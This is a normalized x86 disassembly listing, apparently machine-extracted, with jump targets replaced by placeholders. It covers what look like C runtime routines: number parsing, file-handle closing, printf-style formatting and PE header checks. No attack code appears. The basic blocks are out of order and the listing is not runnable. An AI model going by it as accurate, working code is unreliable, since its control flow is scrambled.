push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
inc [ esi + 0x8 ]
mov edx [ ebp - 0x20 ]
push esi
call [ GetFileType@IAT ]
mov edx [ ebp - 0x20 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x1c ]
sub_42ced9
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
sub esp 0xc
test eax eax
je r-xdata
test ecx ecx
jne r-xdata
mov [ eax ] ecx
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
xor eax eax
leave
retn
push ebx
push esi
push edi
movzx edi [ ecx ]
xor ebx ebx
lea esi [ ecx + 0x2 ]
jmp r-xdata
cmp eax 0x2
jl r-xdata
push 0x8
push edi
call sub_4353ac
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp eax 0x24
jg r-xdata
movzx edi [ esi ]
add esi 0x2
mov eax [ ebp + 0x14 ]
cmp di 0x2d
jne r-xdata
cmp di 0x2b
jne r-xdata
or eax 0x2
jmp r-xdata
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
movzx edi [ esi ]
add esi 0x2
cmp eax 0x10
jne r-xdata
push edi
call sub_4353fe
pop ecx
test eax eax
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
push edi
call sub_4353fe
pop ecx
test eax eax
jne r-xdata
movzx eax [ esi ]
push 0x78
pop ecx
cmp ax cx
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp - 0x4 ]
cmp edx ecx
jae r-xdata
push 0x41
pop eax
cmp ax di
ja r-xdata
movzx eax [ esi ]
push 0x78
pop ecx
cmp ax cx
je r-xdata
push 0x10
pop eax
mov [ ebp + 0x10 ] eax
push 0x58
pop ecx
cmp ax cx
je r-xdata
mov edi [ ebp + 0xc ]
mov edi [ ebp - 0x8 ]
or eax 0x8
mov [ ebp - 0x4 ] eax
cmp ebx edi
jb r-xdata
push 0x19
lea eax [ edi - 0x61 ]
pop ecx
cmp ax cx
jbe r-xdata
cmp di 0x5a
jbe r-xdata
movzx edi [ esi + 0x2 ]
add esi 0x4
push 0x58
pop ecx
cmp ax cx
jne r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
test al 0x4
jne r-xdata
test edi edi
je r-xdata
imul ebx ecx
add ebx edx
jne r-xdata
lea eax [ edi - 0x61 ]
movzx edx di
cmp ax cx
ja r-xdata
mov eax [ ebp - 0x4 ]
push 0x19
pop ecx
call sub_427b11
mov [ eax ] 0x22
mov eax [ ebp - 0x4 ]
test al 0x1
je r-xdata
test al 0x1
jne r-xdata
xor ebx ebx
jmp r-xdata
mov esi [ ebp + 0x8 ]
push edi
call sub_4353fe
mov edx eax
pop ecx
cmp edx 0xffffffff
jne r-xdata
mov edi [ ebp + 0xc ]
or eax 0x4
mov [ ebp - 0x4 ] eax
test edi edi
je r-xdata
cmp edx [ ebp - 0xc ]
jbe r-xdata
add edx 0xffffffc9
sub edx 0x20
push 0x0
test al 0x2
pop ebx
setne bl
add ebx 0x7fffffff
or ebx 0xffffffff
jmp r-xdata
test edi edi
je r-xdata
mov ecx eax
and ecx 0x2
je r-xdata
sub esi 0x2
test al 0x8
jne r-xdata
jmp r-xdata
test al 0x2
je r-xdata
mov [ edi ] esi
test ecx ecx
jne r-xdata
cmp ebx 0x80000000
ja r-xdata
movzx edi [ esi ]
add esi 0x2
jmp r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn
neg ebx
cmp ebx 0x7fffffff
jbe r-xdata
sub_42d0cd
push 0x10
push r--data
call sub_429ad0
mov esi [ ebp + 0x8 ]
cmp esi 0xfffffffe
jne r-xdata
test esi esi
js r-xdata
call sub_427add
and [ eax ] 0x0
call sub_427b11
mov [ eax ] 0x9
jmp r-xdata
call sub_427add
and [ eax ] 0x0
call sub_427b11
mov [ eax ] 0x9
call sub_42a231
cmp esi [ rw-data ]
jae r-xdata
or eax 0xffffffff
mov ebx esi
sar ebx 0x5
mov edi esi
and edi 0x1f
shl edi 0x6
mov eax [ ebx * 4 + rw-data ]
movsx eax [ eax + edi + 0x4 ]
and eax 0x1
je r-xdata
push esi
call sub_434fa5
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx * 4 + rw-data ]
test [ eax + edi + 0x4 ] 0x1
je r-xdata
call sub_427b11
mov [ eax ] 0x9
or edi 0xffffffff
push esi
call sub_42d197
pop ecx
mov edi eax
jmp r-xdata
call sub_429b15
retn
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42d16e
mov eax edi
jmp r-xdata
sub_42d197
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
call sub_43525c
pop ecx
cmp eax 0xffffffff
je r-xdata
xor esi esi
mov eax [ rw-data ]
cmp edi 0x1
jne r-xdata
xor eax eax
push esi
call sub_427af0
pop ecx
or eax 0xffffffff
jmp r-xdata
cmp edi 0x2
jne r-xdata
test [ eax + 0x84 ] 0x1
jne r-xdata
pop edi
pop esi
pop ebp
retn
push edi
call sub_43525c
pop ecx
push eax
call [ CloseHandle@IAT ]
test eax eax
jne r-xdata
test [ eax + 0x44 ] 0x1
je r-xdata
push 0x2
call sub_43525c
push 0x1
mov esi eax
call sub_43525c
pop ecx
pop ecx
cmp eax esi
je r-xdata
call [ GetLastError@IAT ]
mov esi eax
jmp r-xdata
push edi
call sub_4351d6
pop ecx
mov ecx edi
sar ecx 0x5
and edi 0x1f
mov ecx [ ecx * 4 + rw-data ]
shl edi 0x6
mov [ ecx + edi + 0x4 ] 0x0
test esi esi
je r-xdata
sub_42d231
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test [ esi + 0xc ] 0x83
je r-xdata
pop esi
pop ebp
retn
test [ esi + 0xc ] 0x8
je r-xdata
push [ esi + 0x8 ]
call sub_422732
and [ esi + 0xc ] 0xfffffbf7
xor eax eax
pop ecx
mov [ esi ] eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
sub_42d261
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0xc ]
test [ esi + 0xc ] 0x1000
je r-xdata
pop esi
push esi
call sub_42448b
and [ esi + 0xc ] 0xffffeeff
xor eax eax
pop ecx
mov [ esi + 0x18 ] eax
mov [ esi ] eax
mov [ esi + 0x8 ] eax
sub_42d292
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_42b76c
push eax
call sub_433ef7
pop ecx
pop ecx
test eax eax
je r-xdata
pop esi
pop ebp
retn
push edi
call sub_4240a2
add eax 0x20
cmp esi eax
jne r-xdata
call sub_4240a2
add eax 0x40
cmp esi eax
jne r-xdata
xor edi edi
jmp r-xdata
xor eax eax
xor edi edi
inc edi
inc [ rw-data ]
test [ esi + 0xc ] 0x10c
jne r-xdata
cmp [ edi * 4 + rw-data ] 0x0
push ebx
mov ebx 0x1000
jne r-xdata
mov ecx [ edi * 4 + rw-data ]
mov [ esi + 0x8 ] ecx
mov [ esi ] ecx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x4 ] ebx
push ebx
call sub_4266f1
pop ecx
mov [ edi * 4 + rw-data ] eax
test eax eax
jne r-xdata
pop edi
lea eax [ esi + 0x14 ]
push 0x2
mov [ esi + 0x8 ] eax
mov [ esi ] eax
pop eax
mov [ esi + 0x18 ] eax
mov [ esi + 0x4 ] eax
jmp r-xdata
or [ esi + 0xc ] 0x1102
xor eax eax
inc eax
pop ebx
jmp r-xdata
sub_42d338
push ebp
mov ebp esp
sub esp 0x280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov [ ebp - 0x230 ] eax
xor eax eax
mov ebx eax
lea ecx [ ebp - 0x278 ]
mov [ ebp - 0x210 ] esi
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x250 ] eax
mov [ ebp - 0x218 ] ebx
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x23c ] eax
call sub_4247f2
call sub_427b11
mov [ ebp - 0x254 ] eax
mov eax [ ebp - 0x230 ]
test eax eax
je r-xdata
call sub_427b11
mov [ eax ] 0x16
call sub_42a231
or eax 0xffffffff
jmp r-xdata
test [ eax + 0xc ] 0x40
jne r-xdata
cmp [ ebp - 0x26c ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
test esi esi
je r-xdata
push eax
call sub_42b76c
pop ecx
mov ecx eax
cmp ecx 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_421ed7
leave
retn
mov ecx [ ebp - 0x270 ]
and [ ecx + 0x70 ] 0xfffffffd
mov cl [ esi ]
xor eax eax
mov edx eax
mov [ ebp - 0x220 ] edx
mov [ ebp - 0x224 ] eax
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x211 ] cl
mov [ ebp - 0x24c ] cl
test cl cl
je r-xdata
mov edx rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax edx
mov esi [ ebp - 0x264 ]
mov eax [ ebp - 0x210 ]
cmp ecx 0xffffffff
je r-xdata
mov edx ecx
and edx 0x1f
sar eax 0x5
shl edx 0x6
add edx [ eax * 4 + rw-data ]
jmp r-xdata
lea eax [ ecx - 0x20 ]
cmp al 0x58
ja r-xdata
mov ecx rw-data
cmp ecx 0xfffffffe
je r-xdata
test [ edx + 0x24 ] 0x7f
jne r-xdata
xor eax eax
movsx eax cl
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov eax ecx
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
add ecx [ eax * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x210 ]
jmp [ eax * 4 + jump_table_42dea0 ]
mov edi [ ebp - 0x244 ]
movsx edi [ edi + eax * 8 + r--data ]
mov eax edi
sar eax 0x4
mov [ ebp - 0x244 ] edi
mov edi [ ebp - 0x21c ]
mov [ ebp - 0x244 ] eax
cmp eax 0x7
ja r-xdata
test [ ecx + 0x24 ] 0x80
jne r-xdata
inc eax
mov [ ebp - 0x210 ] eax
test edx edx
js r-xdata
xor eax eax
or [ ebp - 0x228 ] 0xffffffff
mov ebx eax
mov [ ebp - 0x260 ] eax
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] ebx
mov [ ebp - 0x23c ] eax
jmp r-xdata
movsx eax cl
sub eax 0x20
je r-xdata
cmp cl 0x2a
jne r-xdata
xor eax eax
mov [ ebp - 0x228 ] eax
jmp r-xdata
cmp cl 0x2a
jne r-xdata
cmp cl 0x49
je r-xdata
xor eax eax
movsx eax cl
cmp eax 0x64
jg r-xdata
or ebx 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x238 ]
imul eax eax 0xa
mov [ ebp - 0x238 ] eax
movsx eax cl
mov ecx [ ebp - 0x238 ]
add ecx 0xffffffd0
add ecx eax
mov [ ebp - 0x238 ] ecx
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x238 ] eax
test eax eax
jns r-xdata
mov edx [ ebp - 0x228 ]
imul edx edx 0xa
movsx eax cl
add edx 0xffffffd0
add edx eax
mov [ ebp - 0x228 ] edx
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x228 ] eax
test eax eax
mov eax [ ebp - 0x210 ]
mov [ ebp - 0x21c ] edi
jns r-xdata
mov eax [ ebp - 0x210 ]
mov al [ eax ]
cmp al 0x36
jne r-xdata
cmp cl 0x68
je r-xdata
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
push [ ebp - 0x24c ]
call sub_42dec0
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
push [ ebp - 0x24c ]
call sub_42dec0
mov ecx [ ebp - 0x210 ]
add esp 0xc
mov al [ ecx ]
inc ecx
mov [ ebp - 0x24c ] al
mov [ ebp - 0x210 ] ecx
test al al
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
mov [ ebp - 0x218 ] ebx
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or ebx 0x4
neg eax
mov [ ebp - 0x218 ] ebx
mov [ ebp - 0x238 ] eax
jmp r-xdata
mov edx [ ebp - 0x220 ]
mov cl [ eax ]
mov [ ebp - 0x211 ] cl
mov [ ebp - 0x24c ] cl
test cl cl
jne r-xdata
or [ ebp - 0x228 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
mov edi [ ebp - 0x210 ]
cmp [ edi + 0x1 ] 0x34
jne r-xdata
or ebx 0x20
jmp r-xdata
mov eax [ ebp - 0x210 ]
cmp cl 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or ebx 0x40
mov [ ebp - 0x218 ] ebx
cmp eax 0x53
jg r-xdata
or ebx 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
mov edi [ ebp - 0x210 ]
cmp [ edi + 0x1 ] 0x32
jne r-xdata
mov eax edi
add eax 0x2
or ebx 0x8000
jmp r-xdata
cmp [ eax ] 0x6c
jne r-xdata
cmp cl 0x77
jne r-xdata
mov edx [ ebp - 0x228 ]
mov ecx 0x7fffffff
cmp edx 0xffffffff
je r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x228 ] 0x8
cmp eax 0x65
jl r-xdata
mov ecx [ edi ]
add edi 0x8
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
xor esi esi
jmp r-xdata
test ebx 0x1000
je r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or ebx 0x4
sub eax 0x3
mov eax [ ebp - 0x210 ]
jne r-xdata
cmp al 0x69
je r-xdata
mov eax edi
add eax 0x2
and ebx 0xffff7fff
jmp r-xdata
mov [ ebp - 0x218 ] ebx
jmp r-xdata
or ebx 0x10
jmp r-xdata
inc eax
or ebx 0x1000
jmp r-xdata
or ebx 0x800
jmp r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x21c ] edi
test ebx 0x810
je r-xdata
mov ecx edx
mov [ ebp - 0x224 ] 0xa
sub eax 0x3
jne r-xdata
pop eax
mov [ ebp - 0x250 ] eax
mov [ ebp - 0x224 ] 0x10
test bl bl
jns r-xdata
cmp [ ebp - 0x248 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
test bl 0x40
je r-xdata
add edi 0x4
xor esi esi
mov [ ebp - 0x21c ] edi
test bl 0x20
je r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
test ebx 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or ebx 0x8
cmp al 0x6f
je r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
push 0x27
test ebx 0x8000
jne r-xdata
add al 0x51
mov [ ebp - 0x22c ] 0x30
mov [ ebp - 0x22b ] al
mov [ ebp - 0x234 ] 0x2
jmp r-xdata
mov edx [ ebp - 0x220 ]
test bl 0x40
je r-xdata
mov eax [ ebp - 0x228 ]
or ebx 0x40
mov edx 0x200
mov [ ebp - 0x218 ] ebx
lea esi [ ebp - 0x20c ]
mov [ ebp - 0x240 ] edx
test eax eax
jns r-xdata
cmp eax 0x69
je r-xdata
test ebx 0x9000
jne r-xdata
cmp edi esi
jg r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x21c ] edi
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
or ebx 0x800
mov [ ebp - 0x218 ] ebx
add cl 0x20
mov [ ebp - 0x260 ] 0x1
mov [ ebp - 0x211 ] cl
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax esi
jmp r-xdata
mov esi [ rw-data ]
mov [ ebp - 0x23c ] 0x1
mov eax esi
test ecx ecx
je r-xdata
mov esi [ rw-data ]
push eax
call sub_422732
xor eax eax
pop ecx
mov [ ebp - 0x258 ] eax
mov edi [ ebp - 0x238 ]
sub edi [ ebp - 0x224 ]
mov eax [ ebp - 0x234 ]
sub edi eax
test bl 0xc
jne r-xdata
test ebx 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x228 ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
mov edx [ ebp - 0x228 ]
test edx edx
jns r-xdata
mov edi esi
jl r-xdata
mov ecx [ edi - 0x4 ]
mov edi esi
mov eax [ edi - 0x4 ]
movzx eax [ edi - 0x4 ]
jmp r-xdata
movsx eax [ edi - 0x4 ]
jmp r-xdata
mov esi [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
dec eax
dec eax
jne r-xdata
test ebx 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
test ecx ecx
jne r-xdata
sub eax esi
sar eax 0x1
jmp r-xdata
xor edx edx
push [ ebp - 0x254 ]
lea ecx [ ebp - 0x220 ]
push ecx
push [ ebp - 0x230 ]
push eax
lea eax [ ebp - 0x22c ]
push eax
call sub_42df32
add esp 0x14
test bl 0x8
je r-xdata
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
push edi
push 0x20
call sub_42df06
mov eax [ ebp - 0x234 ]
add esp 0x10
test bl 0x1
je r-xdata
mov [ ebp - 0x22c ] 0x2d
jmp r-xdata
cmp eax edx
jle r-xdata
cmp cl 0x67
jne r-xdata
mov eax [ edi ]
add edi 0x8
mov [ ebp - 0x280 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x27c ] eax
lea eax [ ebp - 0x278 ]
push eax
push [ ebp - 0x260 ]
movsx eax cl
push [ ebp - 0x228 ]
mov [ ebp - 0x21c ] edi
push eax
push [ ebp - 0x240 ]
lea eax [ ebp - 0x280 ]
push esi
push eax
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
mov edi ebx
add esp 0x1c
and edi 0x80
je r-xdata
add edi 0x4
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
call sub_423351
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
and ebx 0xfffffff7
mov eax 0x200
mov [ ebp - 0x218 ] ebx
cmp edx eax
jle r-xdata
xor edx edx
inc edx
jmp r-xdata
neg ecx
adc edi esi
neg edi
or ebx 0x100
mov [ ebp - 0x218 ] ebx
cmp ecx esi
jae r-xdata
cdq
mov ecx eax
mov edi edx
jmp r-xdata
mov [ ebp - 0x224 ] eax
movsx eax [ eax ]
test ebx 0x800
je r-xdata
add edi 0x4
mov [ ebp - 0x21c ] edi
test ebx 0x810
je r-xdata
or ebx 0x800
mov [ ebp - 0x218 ] ebx
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax esi
add eax 0x2
test ecx ecx
jne r-xdata
cmp [ ebp - 0x23c ] 0x0
mov eax [ ebp - 0x224 ]
je r-xdata
test bl 0x4
jne r-xdata
test bl 0x2
je r-xdata
mov [ ebp - 0x22c ] 0x2b
jmp r-xdata
mov [ ebp - 0x234 ] 0x1
cmp eax 0xa3
jle r-xdata
mov eax edx
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x228 ] 0x1
jmp r-xdata
cmp [ ebp - 0x211 ] 0x67
jne r-xdata
cmp [ ebp - 0x228 ] 0x0
jne r-xdata
mov eax [ ebp - 0x220 ]
test bl 0x20
je r-xdata
mov [ ebp - 0x224 ] 0x8
test bl bl
jns r-xdata
mov eax ecx
or eax edi
jne r-xdata
mov edx eax
xor ecx ecx
mov [ ebp - 0x23c ] ecx
jmp r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x23c ] 0x1
jmp r-xdata
mov al [ edi - 0x4 ]
mov [ ebp - 0x20c ] al
mov [ ebp - 0x224 ] 0x1
movzx eax [ edi - 0x4 ]
push eax
push 0x200
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x224 ]
push eax
call sub_4356bf
add esp 0x10
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x244 ] eax
jmp r-xdata
inc eax
dec ecx
cmp [ eax ] dx
je r-xdata
push [ ebp - 0x254 ]
lea ecx [ ebp - 0x220 ]
push ecx
push [ ebp - 0x230 ]
push eax
push esi
call sub_42df32
add esp 0x14
test eax eax
jle r-xdata
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
push edi
push 0x30
call sub_42df06
add esp 0x10
mov [ ebp - 0x22c ] 0x20
lea edi [ eax + 0x15d ]
push edi
call sub_4266f1
pop ecx
mov cl [ ebp - 0x211 ]
mov [ ebp - 0x258 ] eax
test eax eax
je r-xdata
cmp [ esi ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x278 ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov [ edi ] eax
mov [ edi ] ax
jmp r-xdata
or ebx 0x200
mov [ ebp - 0x218 ] ebx
jmp r-xdata
lea esi [ ebp - 0xd ]
mov [ ebp - 0x234 ] esi
lea esi [ ebp - 0x20c ]
jmp r-xdata
mov [ ebp - 0x248 ] 0x1
jmp r-xdata
mov [ ebp - 0x23c ] eax
lea eax [ ebp - 0x278 ]
push eax
movzx eax cl
push eax
call sub_432c17
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x258 ]
test eax eax
je r-xdata
test bl 0x4
je r-xdata
mov ecx esi
mov [ ebp - 0x228 ] 0xa3
mov esi eax
mov [ ebp - 0x240 ] edi
jmp r-xdata
push esi
call sub_425610
pop ecx
jmp r-xdata
or ebx 0x100
mov [ ebp - 0x218 ] ebx
inc esi
jmp r-xdata
lea eax [ ebp - 0x278 ]
push eax
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
pop ecx
pop ecx
mov [ ebp - 0x248 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x224 ]
cdq
push edx
push eax
push edi
push ecx
call sub_434f10
add ecx 0x30
mov [ ebp - 0x264 ] ebx
mov [ ebp - 0x240 ] eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ecx
or eax edi
je r-xdata
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
push edi
push 0x20
call sub_42df06
add esp 0x10
or edx 0xffffffff
mov [ ebp - 0x220 ] edx
jmp r-xdata
cmp [ ebp - 0x25c ] eax
je r-xdata
mov edi [ ebp - 0x21c ]
mov edx [ ebp - 0x228 ]
mov [ esi ] cl
mov ecx [ ebp - 0x240 ]
dec esi
jmp r-xdata
add ecx [ ebp - 0x250 ]
mov ebx [ ebp - 0x218 ]
lea eax [ ebp - 0xd ]
sub eax esi
inc esi
mov [ ebp - 0x224 ] eax
test ebx 0x200
je r-xdata
test edx edx
js r-xdata
push [ ebp - 0x254 ]
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
lea eax [ ebp - 0xc ]
push [ ebp - 0x25c ]
push eax
call sub_42df32
mov eax [ ebp - 0x240 ]
mov ecx [ ebp - 0x264 ]
add esp 0x14
test eax eax
jne r-xdata
mov eax edx
dec edx
mov [ ebp - 0x228 ] edx
test eax eax
jg r-xdata
test eax eax
je r-xdata
dec eax
mov [ ebp - 0x240 ] eax
movzx eax [ ecx ]
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x25c ]
add ecx 0x2
push eax
mov [ ebp - 0x264 ] ecx
call sub_4356bf
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec esi
inc [ ebp - 0x224 ]
mov [ esi ] 0x30
jmp r-xdata
cmp [ esi ] 0x30
je r-xdata
mov edx [ ebp - 0x220 ]
sub_42dec0
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
test [ edx + 0xc ] 0x40
je r-xdata
dec [ edx + 0x4 ]
js r-xdata
cmp [ edx + 0x8 ] 0x0
je r-xdata
movsx eax [ ebp + 0x8 ]
push edx
push eax
call sub_42a772
pop ecx
pop ecx
mov eax [ edx ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
inc [ edx ]
movzx eax cl
jmp r-xdata
mov eax [ ebp + 0x10 ]
inc [ eax ]
pop ebp
retn
mov eax [ ebp + 0x10 ]
or [ eax ] 0xffffffff
pop ebp
retn
cmp eax 0xffffffff
jne r-xdata
sub_42df06
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
test esi esi
jle r-xdata
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0x14 ]
pop edi
test esi esi
jg r-xdata
push edi
push [ ebp + 0x10 ]
dec esi
push [ ebp + 0x8 ]
call sub_42dec0
add esp 0xc
cmp [ edi ] 0xffffffff
je r-xdata
sub_42df32
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x18 ]
push edi
mov edi [ ebp + 0x10 ]
mov eax [ esi ]
test [ edi + 0xc ] 0x40
mov [ ebp + 0x18 ] eax
je r-xdata
and [ esi ] 0x0
push ebx
mov ebx [ ebp + 0xc ]
test ebx ebx
jle r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
mov [ esi ] eax
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0xc ]
add [ ecx ] eax
jmp r-xdata
test ebx ebx
jg r-xdata
cmp [ esi ] 0x2a
jne r-xdata
pop edi
pop esi
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
push edi
movzx eax [ eax ]
push eax
dec ebx
call sub_42dec0
mov eax [ ebp + 0x14 ]
add esp 0xc
inc [ ebp + 0x8 ]
cmp [ eax ] 0xffffffff
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
push eax
push edi
push 0x3f
call sub_42dec0
mov eax [ ebp + 0x14 ]
add esp 0xc
pop ebx
mov eax [ ebp + 0x18 ]
sub_42dfaa
push esi
push edi
mov esi r--data
mov edi r--data
jmp r-xdata
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
add esi 0x4
call eax
sub_42dfca
push esi
push edi
mov esi r--data
mov edi r--data
jmp r-xdata
cmp esi edi
jb r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop edi
pop esi
retn
add esi 0x4
call eax
sub_42dff0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov ecx [ eax + 0x3c ]
add ecx eax
push esi
movzx eax [ ecx + 0x14 ]
movzx ebx [ ecx + 0x6 ]
add eax 0x18
xor edx edx
add eax ecx
push edi
test ebx ebx
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx ebx
jb r-xdata
mov ecx [ eax + 0x8 ]
add ecx esi
cmp edi ecx
jb r-xdata
mov esi [ eax + 0xc ]
cmp edi esi
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_42e040
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_429b30
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push __dos_header
call sub_42e100
add esp 0x4
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
sub eax __dos_header
push eax
push __dos_header
call sub_42dff0
add esp 0x8
test eax eax
je r-xdata
mov eax [ eax + 0x24 ]
shr eax 0x1f
not eax
and eax 0x1
mov [ ebp - 0x4 ] 0xfffffffe
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42e100
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx 0x5a4d
cmp [ eax ] cx
je r-xdata
mov ecx [ eax + 0x3c ]
add ecx eax
xor eax eax
cmp [ ecx ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
pop ebp
retn
mov edx 0x10b
cmp [ ecx + 0x18 ] dx
sete al
sub_42e216
push 0x24
push r--data
call sub_429ad0
xor ebx ebx
mov [ ebp - 0x20 ] ebx
xor edi edi
mov [ ebp - 0x28 ] edi
mov esi [ ebp + 0x8 ]
cmp esi 0xb
jg r-xdata
mov eax esi
sub eax 0xf
je r-xdata
je r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_42f50e
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax esi
push 0x2
pop ecx
sub eax ecx
je r-xdata
xor eax eax
test eax eax
jne r-xdata
mov [ ebp - 0x1c ] rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
push esi
call sub_42e3cb
pop ecx
